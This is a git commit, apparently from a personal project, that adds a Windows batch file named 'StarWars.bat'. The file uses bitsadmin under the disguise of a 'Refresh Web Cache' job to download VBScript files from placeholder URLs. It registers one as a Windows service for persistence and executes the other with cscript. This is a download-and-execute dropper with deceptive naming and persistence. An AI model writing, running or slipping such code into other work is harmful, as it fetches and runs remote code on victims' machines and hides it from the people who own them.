8eaeaddabadafe9f216f46c15e90ec29f6b9510f
Niyusha <niyushazarnegar@gmail.com>
2016-02-16 16:10:19 -0800

    Added Main Script
    wololololooolo

---
+++ StarWars.bat
@@ -0,0 +1,11 @@
+bitsadmin.exe /transfer "Refresh Web Cache" http://javaplaceholder C:\Users\SterWers.vbs
+sc create refreshWebCache binpath= "cscript C:\Users\SterWers.vbs"
+
+bitsadmin.exe /transfer "Refresh Web Cache" http://vbholder C:\Users\StarWars.vbs
+cscript "C:\Users\StarWars.vbs"
+
+
+
+
+
+
